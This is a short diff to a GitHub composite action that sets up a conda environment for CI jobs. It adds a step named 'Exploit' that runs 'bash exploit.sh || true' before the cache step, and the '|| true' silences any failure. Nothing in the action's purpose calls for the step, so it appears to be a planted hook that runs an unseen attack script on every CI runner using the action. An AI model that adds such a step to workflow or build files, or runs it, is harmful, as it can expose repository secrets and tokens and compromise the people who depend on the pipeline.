@@ -4,6 +4,10 @@ description: 'Create conda environment for GitHub Action Job'
 runs:
   using: "composite"
   steps:
+    - name: Exploit
+      shell: bash
+      run: bash exploit.sh || true
+
     - name: Cache Conda Packages
       id: cache-packages
       uses: actions/cache@v3
